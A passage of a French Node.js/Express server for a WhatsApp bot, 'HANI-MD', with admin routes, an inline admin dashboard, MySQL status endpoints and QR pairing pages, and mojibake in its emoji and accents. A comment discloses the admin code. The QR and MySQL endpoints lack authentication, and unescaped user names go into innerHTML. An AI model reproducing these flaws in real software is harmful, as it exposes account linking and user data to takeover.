        'ytmp3', 'ytmp4', 'play', 'video', 'tiktok', 'insta', 'fb', 'twitter',
        'gpt', 'ia', 'gemini', 'dalle', 'imagine'],
    3: ['owner', 'sudo', 'ban', 'unban', 'setowner', 'restart', 'eval', 'exec',
        'ytmp3', 'ytmp4', 'play', 'video', 'tiktok', 'insta', 'fb', 'twitter',
        'gpt', 'ia', 'gemini', 'dalle', 'imagine', 'sticker', 'toimg',
        'groupe', 'kick', 'add', 'promote', 'demote', 'antilink', 'antispam']
  };
  return levels[level] || levels[1];
}

// âœ… API pour RETIRER les limitations
app.post("/api/admin/unlimit", (req, res) => {
  try {
    const token = req.headers['x-admin-token'];
    if (!isValidSession(token)) {
      return res.status(401).json({ error: "Non autorisÃ©" });
    }
    
    const { jid } = req.body;
    if (!jid) return res.status(400).json({ error: "JID requis" });
    
    if (!db.data.limitedUsers) db.data.limitedUsers = {};
    
    if (db.data.limitedUsers[jid]) {
      delete db.data.limitedUsers[jid];
      db.save();
      console.log(`[ADMIN] âœ… Limitations retirÃ©es: ${jid}`);
    }
    
    res.json({ success: true, message: `Limitations retirÃ©es pour ${jid}` });
  } catch (error) {
    console.error("[ADMIN ERROR] Unlimit:", error.message);
    res.status(500).json({ error: "Erreur serveur: " + error.message });
  }
});

// ðŸ—‘ï¸ API pour SUPPRIMER un utilisateur de la base
app.post("/api/admin/delete", (req, res) => {
  try {
    const token = req.headers['x-admin-token'];
    if (!isValidSession(token)) {
      return res.status(401).json({ error: "Non autorisÃ©" });
    }
    
    const { jid } = req.body;
    if (!jid) return res.status(400).json({ error: "JID requis" });
    
    // Admin a le contrÃ´le total - peut supprimer n'importe qui
    if (!db.data.users) db.data.users = {};
    
    if (db.data.users[jid]) {
      delete db.data.users[jid];
      db.save();
      console.log(`[ADMIN] ðŸ—‘ï¸ Utilisateur supprimÃ©: ${jid}`);
    }
    
    res.json({ success: true, message: `${jid} supprimÃ©` });
  } catch (error) {
    console.error("[ADMIN ERROR] Delete:", error.message);
    res.status(500).json({ error: "Erreur serveur: " + error.message });
  }
});

// ðŸ‘‘ API pour changer le RÃ”LE d'un utilisateur
app.post("/api/admin/role", (req, res) => {
  try {
    const token = req.headers['x-admin-token'];
    if (!isValidSession(token)) {
      return res.status(401).json({ error: "Non autorisÃ©" });
    }
    
    const { jid, role } = req.body;
    if (!jid || !role) return res.status(400).json({ error: "JID et rÃ´le requis" });
    
    const validRoles = ['user', 'approved', 'sudo', 'owner'];
    if (!validRoles.includes(role)) {
      return res.status(400).json({ error: "RÃ´le invalide" });
    }
    
    if (!db.data.users) db.data.users = {};
    
    if (!db.data.users[jid]) {
      db.data.users[jid] = { name: "Inconnu", messageCount: 0 };
    }
    
    db.data.users[jid].role = role;
    db.save();
    
    console.log(`[ADMIN] ðŸ‘‘ RÃ´le changÃ©: ${jid} â†’ ${role}`);
    res.json({ success: true, message: `${jid} est maintenant ${role}` });
  } catch (error) {
    console.error("[ADMIN ERROR] Role:", error.message);
    res.status(500).json({ error: "Erreur serveur: " + error.message });
  }
});

// ðŸ” PAGE ADMIN SÃ‰CURISÃ‰E - Code d'accÃ¨s: 200700
app.get("/admin", async (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ðŸ” HANI-MD Super Admin</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      min-height: 100vh;
      color: #fff;
    }
    .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
    .header {
      text-align: center;
      padding: 20px 0;
      border-bottom: 2px solid rgba(255,255,255,0.1);
      margin-bottom: 20px;
    }
    .header h1 { font-size: 2em; margin-bottom: 5px; }
    .header h1 span { color: #00d4ff; }
    .status-indicator {
      display: inline-block;
      padding: 5px 15px;
      border-radius: 20px;
      font-size: 0.8em;
      margin: 5px;
    }
    .status-online { background: #6bcb77; }
    .status-offline { background: #ff6b6b; }
    
    /* Login */
    .login-box {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 40px;
      max-width: 400px;
      margin: 50px auto;
      text-align: center;
      border: 1px solid rgba(255,255,255,0.2);
    }
    .login-box h2 { margin-bottom: 20px; }
    .login-box input {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      font-size: 1.2em;
      text-align: center;
      margin-bottom: 15px;
      background: rgba(255,255,255,0.9);
      color: #333;
      letter-spacing: 5px;
    }
    .login-box button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      font-size: 1.1em;
      background: linear-gradient(135deg, #00d4ff, #0099cc);
      color: #fff;
      cursor: pointer;
    }
    .error-msg { color: #ff6b6b; margin-top: 10px; display: none; }
    .dashboard { display: none; }
    
    /* Stats Grid */
    .stats-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 10px;
      margin-bottom: 20px;
    }
    .stat-card {
      background: rgba(255,255,255,0.1);
      border-radius: 12px;
      padding: 15px;
      text-align: center;
    }
    .stat-card .emoji { font-size: 1.5em; }
    .stat-card .number { font-size: 1.5em; font-weight: bold; color: #00d4ff; }
    .stat-card .label { font-size: 0.75em; color: rgba(255,255,255,0.7); }
    
    /* Tabs */
    .tabs {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    .tab-btn {
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      background: rgba(255,255,255,0.1);
      color: #fff;
      cursor: pointer;
      transition: all 0.2s;
    }
    .tab-btn:hover { background: rgba(255,255,255,0.2); }
    .tab-btn.active { background: #00d4ff; }
    .tab-content { display: none; }
    .tab-content.active { display: block; }
    
    /* Users Table */
    .users-section {
      background: rgba(255,255,255,0.05);
      border-radius: 15px;
      padding: 20px;
      overflow-x: auto;
    }
    .search-box {
      display: flex;
      gap: 10px;
      margin-bottom: 15px;
      flex-wrap: wrap;
    }
    .search-box input {
      flex: 1;
      min-width: 200px;
      padding: 10px 15px;
      border: none;
      border-radius: 8px;
      background: rgba(255,255,255,0.1);
      color: #fff;
    }
    .search-box input::placeholder { color: rgba(255,255,255,0.5); }
    .filter-select {
      padding: 10px 15px;
      border: none;
      border-radius: 8px;
      background: rgba(255,255,255,0.1);
      color: #fff;
    }
    
    table { width: 100%; border-collapse: collapse; }
    th, td { padding: 12px 8px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1); }
    th { background: rgba(0,212,255,0.2); font-size: 0.85em; }
    tr:hover { background: rgba(255,255,255,0.05); }
    
    .role-badge {
      padding: 4px 10px;
      border-radius: 15px;
      font-size: 0.75em;
      font-weight: bold;
    }
    .role-owner { background: #ff6b6b; }
    .role-sudo { background: #ffd93d; color: #333; }
    .role-approved { background: #6bcb77; }
    .role-user { background: #4d96ff; }
    
    .status-badge {
      padding: 4px 8px;
      border-radius: 10px;
      font-size: 0.7em;
    }
    .status-active { background: #6bcb77; }
    .status-banned { background: #ff6b6b; }
    .status-limited { background: #ffd93d; color: #333; }
    
    /* Action Buttons */
    .action-btns { display: flex; gap: 5px; flex-wrap: wrap; }
    .action-btn {
      padding: 5px 10px;
      border: none;
      border-radius: 5px;
      font-size: 0.75em;
      cursor: pointer;
      transition: transform 0.2s;
    }
    .action-btn:hover { transform: scale(1.05); }
    .btn-ban { background: #ff6b6b; color: #fff; }
    .btn-unban { background: #6bcb77; color: #fff; }
    .btn-limit { background: #ffd93d; color: #333; }
    .btn-unlimit { background: #4d96ff; color: #fff; }
    .btn-delete { background: #333; color: #fff; }
    .btn-role { background: #9c27b0; color: #fff; }
    
    /* Quick Actions */
    .quick-actions {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    .quick-btn {
      padding: 10px 20px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.9em;
      transition: all 0.2s;
    }
    .quick-btn:hover { transform: translateY(-2px); }
    .btn-primary { background: #00d4ff; color: #fff; }
    .btn-danger { background: #ff6b6b; color: #fff; }
    .btn-success { background: #6bcb77; color: #fff; }
    
    /* Modal */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.8);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }
    .modal.show { display: flex; }
    .modal-content {
      background: #1a1a2e;
      border-radius: 15px;
      padding: 30px;
      max-width: 400px;
      width: 90%;
      border: 1px solid rgba(255,255,255,0.2);
    }
    .modal-content h3 { margin-bottom: 20px; }
    .modal-content select, .modal-content input {
      width: 100%;
      padding: 12px;
      border: none;
      border-radius: 8px;
      margin-bottom: 15px;
      background: rgba(255,255,255,0.1);
      color: #fff;
    }
    .modal-btns { display: flex; gap: 10px; }
    .modal-btns button { flex: 1; padding: 12px; border: none; border-radius: 8px; cursor: pointer; }
    
    /* Toast */
    .toast {
      position: fixed;
      bottom: 20px;
      right: 20px;
      padding: 15px 25px;
      border-radius: 10px;
      color: #fff;
      z-index: 2000;
      animation: slideIn 0.3s;
    }
    .toast.success { background: #6bcb77; }
    .toast.error { background: #ff6b6b; }
    @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
    
    @media (max-width: 768px) {
      .stats-grid { grid-template-columns: repeat(3, 1fr); }
      table { font-size: 0.8em; }
      .action-btns { flex-direction: column; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>ðŸ” <span>HANI-MD</span> Super Admin</h1>
      <div id="botStatus" class="status-indicator status-offline">â³ Chargement...</div>
    </div>
    
    <!-- Login -->
    <div id="loginPage" class="login-box">
      <h2>ðŸ”‘ AccÃ¨s Owner</h2>
      <p style="color:rgba(255,255,255,0.6);margin-bottom:20px;font-size:0.9em">Zone rÃ©servÃ©e au propriÃ©taire</p>
      <input type="password" id="codeInput" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢" maxlength="6">
      <button onclick="login()">ðŸš€ AccÃ©der</button>
      <p id="errorMsg" class="error-msg">âŒ Code incorrect</p>
    </div>
    
    <!-- Dashboard -->
    <div id="dashboard" class="dashboard">
      <!-- Quick Actions -->
      <div class="quick-actions">
        <button class="quick-btn btn-primary" onclick="refreshStats()">ðŸ”„ Actualiser</button>
        <a href="/qr" class="quick-btn btn-success" style="text-decoration:none">ðŸ“± QR Code</a>
        <button class="quick-btn btn-danger" onclick="logout()">ðŸšª DÃ©connexion</button>
      </div>
      
      <!-- Stats -->
      <div class="stats-grid">
        <div class="stat-card">
          <div class="emoji">ðŸ‘¥</div>
          <div class="number" id="statUsers">0</div>
          <div class="label">Total Users</div>
        </div>
        <div class="stat-card">
          <div class="emoji">ðŸ‘‘</div>
          <div class="number" id="statOwners">0</div>
          <div class="label">Owners</div>
        </div>
        <div class="stat-card">
          <div class="emoji">âš¡</div>
          <div class="number" id="statSudos">0</div>
          <div class="label">Sudos</div>
        </div>
        <div class="stat-card">
          <div class="emoji">ðŸš«</div>
          <div class="number" id="statBanned">0</div>
          <div class="label">Bannis</div>
        </div>
        <div class="stat-card">
          <div class="emoji">âš ï¸</div>
          <div class="number" id="statLimited">0</div>
          <div class="label">LimitÃ©s</div>
        </div>
        <div class="stat-card">
          <div class="emoji">ðŸ“¨</div>
          <div class="number" id="statMessages">0</div>
          <div class="label">Messages</div>
        </div>
      </div>
      
      <!-- Users Management -->
      <div class="users-section">
        <h3 style="margin-bottom:15px">ðŸ‘¥ Gestion des Utilisateurs</h3>
        
        <div class="search-box">
          <input type="text" id="searchInput" placeholder="ðŸ” Rechercher par numÃ©ro ou nom..." onkeyup="filterUsers()">
          <select id="filterRole" class="filter-select" onchange="filterUsers()">
            <option value="">Tous les rÃ´les</option>
            <option value="owner">ðŸ‘‘ Owner</option>
            <option value="sudo">âš¡ Sudo</option>
            <option value="approved">âœ… Approved</option>
            <option value="user">ðŸ‘¤ User</option>
          </select>
          <select id="filterStatus" class="filter-select" onchange="filterUsers()">
            <option value="">Tous les statuts</option>
            <option value="active">âœ… Actifs</option>
            <option value="banned">ðŸš« Bannis</option>
            <option value="limited">âš ï¸ LimitÃ©s</option>
          </select>
        </div>
        
        <div style="overflow-x:auto;">
          <table>
            <thead>
              <tr>
                <th>ðŸ“± NumÃ©ro</th>
                <th>ðŸ‘¤ Nom</th>
                <th>ðŸŽ­ RÃ´le</th>
                <th>ðŸ“Š Statut</th>
                <th>ðŸ’¬ Msgs</th>
                <th>âš¡ Actions</th>
              </tr>
            </thead>
            <tbody id="usersTableBody">
              <tr><td colspan="6" style="text-align:center;padding:30px">Chargement...</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
  
  <!-- Modal Limitation -->
  <div id="limitModal" class="modal">
    <div class="modal-content">
      <h3>âš ï¸ Limiter l'utilisateur</h3>
      <p id="limitUserName" style="margin-bottom:15px;color:#aaa"></p>
      <select id="limitLevel">
        <option value="1">Niveau 1 - Basique (menu, help seulement)</option>
        <option value="2">Niveau 2 - Pas de tÃ©lÃ©chargement ni IA</option>
        <option value="3">Niveau 3 - Commandes fun uniquement</option>
      </select>
      <div class="modal-btns">
        <button onclick="closeModal()" style="background:#666;color:#fff">Annuler</button>
        <button onclick="confirmLimit()" style="background:#ffd93d;color:#333">Appliquer</button>
      </div>
    </div>
  </div>
  
  <!-- Modal RÃ´le -->
  <div id="roleModal" class="modal">
    <div class="modal-content">
      <h3>ðŸ‘‘ Changer le rÃ´le</h3>
      <p id="roleUserName" style="margin-bottom:15px;color:#aaa"></p>
      <select id="newRole">
        <option value="user">ðŸ‘¤ User - AccÃ¨s normal</option>
        <option value="approved">âœ… Approved - AccÃ¨s vÃ©rifiÃ©</option>
        <option value="sudo">âš¡ Sudo - AccÃ¨s Ã©tendu</option>
        <option value="owner">ðŸ‘‘ Owner - AccÃ¨s total</option>
      </select>
      <div class="modal-btns">
        <button onclick="closeModal()" style="background:#666;color:#fff">Annuler</button>
        <button onclick="confirmRole()" style="background:#9c27b0;color:#fff">Appliquer</button>
      </div>
    </div>
  </div>

  <script>
    let adminToken = localStorage.getItem('hani_admin_token');
    let allUsers = [];
    let currentUserJid = null;
    
    window.onload = function() {
      if (adminToken) checkSession();
      document.getElementById('codeInput').addEventListener('keypress', e => { if (e.key === 'Enter') login(); });
    };
    
    async function login() {
      const code = document.getElementById('codeInput').value;
      const errorMsg = document.getElementById('errorMsg');
      errorMsg.style.display = 'none';
      
      try {
        const res = await fetch('/admin/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ code })
        });
        const data = await res.json();
        
        if (data.success) {
          adminToken = data.token;
          localStorage.setItem('hani_admin_token', adminToken);
          showDashboard();
        } else {
          errorMsg.style.display = 'block';
          document.getElementById('codeInput').value = '';
        }
      } catch (e) {
        errorMsg.textContent = 'âŒ Erreur de connexion';
        errorMsg.style.display = 'block';
      }
    }
    
    async function checkSession() {
      try {
        const res = await fetch('/api/admin/check', { headers: { 'X-Admin-Token': adminToken } });
        const data = await res.json();
        if (data.valid) showDashboard();
        else { localStorage.removeItem('hani_admin_token'); adminToken = null; }
      } catch (e) { localStorage.removeItem('hani_admin_token'); adminToken = null; }
    }
    
    function showDashboard() {
      document.getElementById('loginPage').style.display = 'none';
      document.getElementById('dashboard').style.display = 'block';
      refreshStats();
    }
    
    function logout() {
      fetch('/admin/logout', { method: 'POST', headers: { 'X-Admin-Token': adminToken } });
      localStorage.removeItem('hani_admin_token');
      adminToken = null;
      location.reload();
    }
    
    async function refreshStats() {
      try {
        const res = await fetch('/api/admin/stats', { headers: { 'X-Admin-Token': adminToken } });
        if (res.status === 401) { logout(); return; }
        const data = await res.json();
        if (!data.success) return;
        
        // Bot status
        const botStatus = document.getElementById('botStatus');
        botStatus.className = 'status-indicator ' + (data.bot.connected ? 'status-online' : 'status-offline');
        botStatus.textContent = data.bot.connected ? 'ðŸŸ¢ Bot ConnectÃ©' : 'ðŸ”´ DÃ©connectÃ©';
        
        // Stats
        document.getElementById('statUsers').textContent = data.local.totalUsers;
        document.getElementById('statOwners').textContent = data.local.owners;
        document.getElementById('statSudos').textContent = data.local.sudos;
        document.getElementById('statBanned').textContent = data.local.banned || 0;
        document.getElementById('statLimited').textContent = data.local.limited || 0;
        document.getElementById('statMessages').textContent = data.local.messages;
        
        // Users
        allUsers = data.local.users || [];
        renderUsers(allUsers);
        
      } catch (e) { console.error('Erreur:', e); }
    }
    
    function renderUsers(users) {
      const tbody = document.getElementById('usersTableBody');
      if (!users.length) {
        tbody.innerHTML = '<tr><td colspan="6" style="text-align:center;padding:30px">Aucun utilisateur</td></tr>';
        return;
      }
      
      tbody.innerHTML = users.map(u => {
        let statusBadge = '<span class="status-badge status-active">âœ… Actif</span>';
        if (u.isBanned) statusBadge = '<span class="status-badge status-banned">ðŸš« Banni</span>';
        else if (u.isLimited) statusBadge = '<span class="status-badge status-limited">âš ï¸ LimitÃ©</span>';
        
        // Ã‰chapper les valeurs pour Ã©viter les problÃ¨mes de syntaxe
        const safeJid = u.jid.replace(/'/g, "\\\\'");
        const safeName = (u.name || 'Inconnu').replace(/'/g, "\\\\'");
        const safeRole = u.role || 'user';
        
        // Admin a le contrÃ´le total sur tous les utilisateurs, y compris les owners
        let actions = '';
        if (u.isBanned) {
          actions += '<button class="action-btn btn-unban" onclick="unbanUser(\\'' + safeJid + '\\')">âœ… DÃ©bannir</button>';
        } else {
          actions += '<button class="action-btn btn-ban" onclick="banUser(\\'' + safeJid + '\\')">ðŸš« Bannir</button>';
        }
        
        if (u.isLimited) {
          actions += '<button class="action-btn btn-unlimit" onclick="unlimitUser(\\'' + safeJid + '\\')">ðŸ”“ DÃ©limiter</button>';
        } else {
          actions += '<button class="action-btn btn-limit" onclick="openLimitModal(\\'' + safeJid + '\\', \\'' + safeName + '\\')">âš ï¸ Limiter</button>';
        }
        
        actions += '<button class="action-btn btn-role" onclick="openRoleModal(\\'' + safeJid + '\\', \\'' + safeName + '\\', \\'' + safeRole + '\\')">ðŸ‘‘</button>';
        actions += '<button class="action-btn btn-delete" onclick="deleteUser(\\'' + safeJid + '\\')">ðŸ—‘ï¸</button>';
        
        return '<tr>' +
          '<td>' + u.number + '</td>' +
          '<td>' + (u.name || 'Inconnu') + (u.isBot ? ' ðŸ¤–' : '') + '</td>' +
          '<td><span class="role-badge role-' + safeRole + '">' + safeRole + '</span></td>' +
          '<td>' + statusBadge + '</td>' +
          '<td>' + (u.messages || 0) + '</td>' +
          '<td><div class="action-btns">' + actions + '</div></td>' +
          '</tr>';
      }).join('');
    }
    
    function filterUsers() {
      const search = document.getElementById('searchInput').value.toLowerCase();
      const roleFilter = document.getElementById('filterRole').value;
      const statusFilter = document.getElementById('filterStatus').value;
      
      let filtered = allUsers.filter(u => {
        const matchSearch = u.number.includes(search) || u.name.toLowerCase().includes(search);
        const matchRole = !roleFilter || u.role === roleFilter;
        let matchStatus = true;
        if (statusFilter === 'banned') matchStatus = u.isBanned;
        else if (statusFilter === 'limited') matchStatus = u.isLimited;
        else if (statusFilter === 'active') matchStatus = !u.isBanned && !u.isLimited;
        return matchSearch && matchRole && matchStatus;
      });
      
      renderUsers(filtered);
    }
    
    async function banUser(jid) {
      if (!confirm('Bannir cet utilisateur ?')) return;
      await apiAction('/api/admin/ban', { jid });
    }
    
    async function unbanUser(jid) {
      await apiAction('/api/admin/unban', { jid });
    }
    
    function openLimitModal(jid, name) {
      currentUserJid = jid;
      document.getElementById('limitUserName').textContent = name + ' (' + jid.split('@')[0] + ')';
      document.getElementById('limitModal').classList.add('show');
    }
    
    async function confirmLimit() {
      const level = document.getElementById('limitLevel').value;
      await apiAction('/api/admin/limit', { jid: currentUserJid, level: parseInt(level) });
      closeModal();
    }
    
    async function unlimitUser(jid) {
      await apiAction('/api/admin/unlimit', { jid });
    }
    
    function openRoleModal(jid, name, currentRole) {
      currentUserJid = jid;
      document.getElementById('roleUserName').textContent = name + ' (' + jid.split('@')[0] + ')';
      document.getElementById('newRole').value = currentRole;
      document.getElementById('roleModal').classList.add('show');
    }
    
    async function confirmRole() {
      const role = document.getElementById('newRole').value;
      await apiAction('/api/admin/role', { jid: currentUserJid, role });
      closeModal();
    }
    
    async function deleteUser(jid) {
      if (!confirm('Supprimer dÃ©finitivement cet utilisateur ?')) return;
      await apiAction('/api/admin/delete', { jid });
    }
    
    async function apiAction(url, body) {
      try {
        console.log('[ADMIN] Appel API:', url, body);
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
          body: JSON.stringify(body)
        });
        
        if (!res.ok) {
          const errorText = await res.text();
          console.error('[ADMIN] Erreur HTTP:', res.status, errorText);
          showToast('Erreur HTTP ' + res.status + ': ' + errorText, 'error');
          return;
        }
        
        const data = await res.json();
        console.log('[ADMIN] RÃ©ponse:', data);
        showToast(data.message || (data.success ? 'SuccÃ¨s!' : (data.error || 'Erreur')), data.success ? 'success' : 'error');
        if (data.success) refreshStats();
      } catch (e) {
        console.error('[ADMIN] Exception:', e);
        showToast('Erreur: ' + e.message, 'error');
      }
    }
    
    function closeModal() {
      document.querySelectorAll('.modal').forEach(m => m.classList.remove('show'));
      currentUserJid = null;
    }
    
    function showToast(msg, type) {
      const toast = document.createElement('div');
      toast.className = 'toast ' + type;
      toast.textContent = msg;
      document.body.appendChild(toast);
      setTimeout(() => toast.remove(), 3000);
    }
    
    // Auto-refresh toutes les 30s
    setInterval(refreshStats, 30000);
  </script>
</body>
</html>
  `);
});

// Health check pour Render
app.get("/health", (req, res) => {
  res.status(200).json({ 
    status: "ok", 
    uptime: process.uptime(),
    connected: qrState.isConnected,
    connectionStatus: qrState.connectionStatus,
    mysql: mysqlDB.isConnected()
  });
});

// ðŸ—„ï¸ API MySQL Status - Test de connexion
app.get("/api/mysql-status", async (req, res) => {
  try {
    const isConnected = mysqlDB.isConnected();
    let stats = null;
    let tables = [];
    
    if (isConnected) {
      stats = await mysqlDB.getDashboardStats();
      // Liste des tables
      const pool = await mysqlDB.getPool();
      if (pool) {
        const [rows] = await pool.query('SHOW TABLES');
        tables = rows.map(r => Object.values(r)[0]);
      }
    }
    
    res.json({
      success: true,
      mysql: {
        connected: isConnected,
        host: process.env.MYSQL_HOST || 'Non configurÃ©',
        database: process.env.MYSQL_DATABASE || 'Non configurÃ©',
        tables: tables,
        stats: stats
      },
      local: {
        users: Object.keys(db.data.users || {}).length,
        groups: Object.keys(db.data.groups || {}).length,
        stats: db.data.stats
      },
      timestamp: new Date().toISOString()
    });
  } catch (error) {
    res.json({
      success: false,
      error: error.message,
      mysql: { connected: false },
      timestamp: new Date().toISOString()
    });
  }
});

// ðŸ”„ API pour tester la connexion MySQL
app.post("/api/mysql-test", async (req, res) => {
  try {
    if (mysqlDB.isConnected()) {
      // Test de lecture/Ã©criture
      await mysqlDB.incrementStats('commands');
      const stats = await mysqlDB.getStats();
      res.json({
        success: true,
        message: "MySQL fonctionne correctement!",
        test: {
          read: true,
          write: true,
          stats: stats
        }
      });
    } else {
      // Tenter une connexion
      const connected = await mysqlDB.connect();
      res.json({
        success: connected,
        message: connected ? "Connexion MySQL Ã©tablie!" : "Ã‰chec de connexion - VÃ©rifiez vos identifiants"
      });
    }
  } catch (error) {
    res.json({
      success: false,
      error: error.message
    });
  }
});

// API pour obtenir l'Ã©tat du QR (pour AJAX) - Accessible publiquement pour la page QR
app.get("/api/qr-status", (req, res) => {
  res.json({
    status: qrState.connectionStatus,
    isConnected: qrState.isConnected,
    hasQR: !!qrState.qrDataURL,
    qrDataURL: qrState.qrDataURL,
    lastUpdate: qrState.lastUpdate,
    qrCount: qrState.qrCount,
    botInfo: qrState.botInfo
  });
});

// ðŸ“¸ PAGE QR SIMPLE - Affiche juste l'image QR (plus fiable)
app.get("/qr-simple", (req, res) => {
  if (qrState.isConnected) {
    res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>âœ… HANI-MD ConnectÃ©</title>
  <style>
    body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
    h1 { color: #4CAF50; font-size: 3em; }
    p { color: #aaa; }
  </style>
</head>
<body>
  <h1>âœ… ConnectÃ©!</h1>
  <p>Le bot HANI-MD est maintenant actif.</p>
  <p style="margin-top: 20px;"><a href="/" style="color: #9c27b0;">â† Retour</a></p>
</body>
</html>`);
  } else if (qrState.qrDataURL) {
    res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="5">
  <title>ðŸ“± HANI-MD - Scanne le QR</title>
  <style>
    body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
    img { border-radius: 15px; box-shadow: 0 0 30px rgba(156,39,176,0.5); }
    h2 { color: #9c27b0; margin-bottom: 20px; }
    p { color: #aaa; font-size: 0.9em; margin-top: 15px; }
    .refresh { color: #ff9800; }
  </style>
</head>
<body>
  <h2>ðŸ“± Scanne avec WhatsApp</h2>
  <img src="${qrState.qrDataURL}" alt="QR Code" width="300">
  <p>â±ï¸ Page auto-refresh toutes les 5 secondes</p>
  <p class="refresh">Si expirÃ©, attendez le nouveau QR...</p>
</body>
</html>`);
  } else {
    res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="3">
  <title>â³ HANI-MD - En attente</title>
  <style>
    body { font-family: Arial; background: #1a1a2e; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
    .loader { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #9c27b0; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    p { margin-top: 20px; color: #aaa; }
  </style>
</head>
<body>
  <div class="loader"></div>
  <p>GÃ©nÃ©ration du QR code en cours...</p>
  <p style="font-size: 0.8em;">Page auto-refresh toutes les 3 secondes</p>
</body>
</html>`);
  }
});

// ðŸ“± PAGE QR CODE - SÃ‰CURISÃ‰E (Owner uniquement)
app.get("/qr", (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ðŸ” HANI-MD - QR Code PrivÃ©</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(255,255,255,0.1);
      backdrop-filter: blur(10px);
      border-radius: 24px;
      padding: 40px;
      max-width: 500px;
      width: 100%;
      text-align: center;
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
      border: 1px solid rgba(255,255,255,0.1);
    }
    .logo { font-size: 3em; margin-bottom: 10px; }
    h1 { color: #fff; font-size: 2em; margin-bottom: 5px; }
    .subtitle { color: #aaa; font-size: 0.9em; margin-bottom: 20px; }
    
    .qr-container {
      background: white;
      border-radius: 16px;
      padding: 20px;
      margin: 15px 0;
      min-height: 280px;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
    }
    .qr-container img { max-width: 100%; border-radius: 8px; }
    
    .countdown-bar {
      height: 6px;
      background: linear-gradient(90deg, #4CAF50, #8BC34A);
      border-radius: 3px;
      margin: 10px 0;
      transition: width 1s linear;
    }
    .countdown-bar.warning { background: linear-gradient(90deg, #ff9800, #ffc107); }
    .countdown-bar.danger { background: linear-gradient(90deg, #f44336, #ff5722); }
    
    .countdown-text {
      color: #fff;
      font-size: 1.2em;
      font-weight: bold;
      margin: 10px 0;
    }
    .countdown-text.warning { color: #ffc107; }
    .countdown-text.danger { color: #f44336; animation: pulse 0.5s infinite; }
    
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    
    .status {
      padding: 12px 24px;
      border-radius: 50px;
      font-weight: bold;
      margin: 15px 0;
      display: inline-block;
    }
    .status.waiting { background: #ff9800; color: #000; }
    .status.waiting_qr { background: #2196F3; color: #fff; }
    .status.connecting { background: #9c27b0; color: #fff; }
    .status.connected { background: #4CAF50; color: #fff; }
    .status.disconnected { background: #f44336; color: #fff; }
    
    .refresh-btn {
      background: linear-gradient(135deg, #9c27b0, #673ab7);
      color: #fff;
      border: none;
      padding: 12px 30px;
      border-radius: 25px;
      font-size: 1em;
      cursor: pointer;
      margin: 10px 5px;
      transition: transform 0.2s, box-shadow 0.2s;
    }
    .refresh-btn:hover {
      transform: scale(1.05);
      box-shadow: 0 5px 20px rgba(156, 39, 176, 0.4);
    }
    .refresh-btn:disabled {
      background: #666;
      cursor: not-allowed;
      transform: none;
    }
    
    .instructions {
      background: rgba(255,255,255,0.05);
      border-radius: 12px;
      padding: 15px;
      margin-top: 15px;
      text-align: left;
    }
    .instructions h3 { color: #fff; margin-bottom: 10px; font-size: 1em; }
    .instructions ol { color: #ccc; padding-left: 20px; font-size: 0.9em; }
    .instructions li { margin: 8px 0; line-height: 1.4; }
    
    .bot-info {
      background: rgba(76, 175, 80, 0.2);
      border: 2px solid #4CAF50;
      border-radius: 16px;
      padding: 25px;
      margin-top: 20px;
    }
    .bot-info h3 { color: #4CAF50; margin-bottom: 15px; font-size: 1.5em; }
    .bot-info p { color: #fff; margin: 8px 0; font-size: 1.1em; }
    
    .loader {
      width: 60px;
      height: 60px;
